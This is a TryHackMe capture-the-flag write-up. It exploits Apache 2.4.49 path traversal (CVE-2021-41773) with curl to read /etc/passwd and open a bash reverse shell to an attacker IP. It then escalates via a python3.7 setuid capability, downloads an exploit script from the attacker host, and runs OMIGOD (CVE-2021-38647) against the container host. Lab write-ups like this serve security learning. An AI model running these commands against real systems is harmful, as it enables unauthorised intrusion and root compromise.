# My Own Webserver  tryhackme writeup

---

## Nmap Scan

```ruby
└─$ nmap -sCV -Pn 10.113.144.57                                                                          
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-15 17:53 EDT
Nmap scan report for 10.113.144.57
Host is up (0.12s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Consult - Business Consultancy Agency Template | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.46 seconds

```

---

<img width="1919" height="745" alt="image" src="https://github.com/user-attachments/assets/f9d57283-d6ce-46dc-865b-2d39523edda4" />

```
whatweb http://10.113.144.57/
```

<img width="1625" height="116" alt="image" src="https://github.com/user-attachments/assets/4944cd3f-e50b-4c65-94ab-99915cfb9ad7" />

## [CVE-2021-41773](https://www.exploit-db.com/exploits/50383)

<img width="1919" height="794" alt="image" src="https://github.com/user-attachments/assets/7e40e254-d191-42e3-8d92-55c9db08d3c9" />

---

```
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; cat /etc/passwd" "http://10.113.144.57/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
```

<img width="1651" height="498" alt="image" src="https://github.com/user-attachments/assets/ed73fc6a-5b79-47d2-bbd0-5628ea29997a" />

## get reverseshell

```
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; bash -c 'bash -i >& /dev/tcp/192.168.134.38/4444 0>&1'" "http://10.113.144.57/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
```

<img width="979" height="207" alt="image" src="https://github.com/user-attachments/assets/36b0e1b7-c95d-48d5-8bdd-d9424fdfb089" />

## privesc

## find capabileties 

```
getcap -r / 2>/dev/null
```

<img width="466" height="89" alt="image" src="https://github.com/user-attachments/assets/5a98d80f-596d-46b6-b276-82f5beebbcfb" />

```
python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

<img width="1081" height="172" alt="image" src="https://github.com/user-attachments/assets/e89feaf5-4c88-47fc-a1b1-8bd3f9da0ed2" />

----

## get userflag

<img width="1065" height="544" alt="image" src="https://github.com/user-attachments/assets/d73ce1e0-4b0a-450c-8a18-ddbd5bcb6819" />

---

```
curl http://192.168.134.38:8888/CVE-2021-38647.py -o exploit.py
```

----

### after sending nmap and scan the for ports 

## [CVE-2021-38647](https://github.com/AlteredSecurity/CVE-2021-38647/blob/main/CVE-2021-38647.py)

```
python3 exploit.py -t 172.17.0.1 -p 5986 -c id
```

<img width="1600" height="292" alt="image" src="https://github.com/user-attachments/assets/09bb4ef7-9d5f-4cf4-9500-cc5e1608db24" />

```
python3 exploit.py -t 172.17.0.1 -p 5986 -c "cat /root/root.txt"
```

<img width="1604" height="301" alt="image" src="https://github.com/user-attachments/assets/e1dbc2de-ab0e-4f86-b187-6db69a5d1e82" />

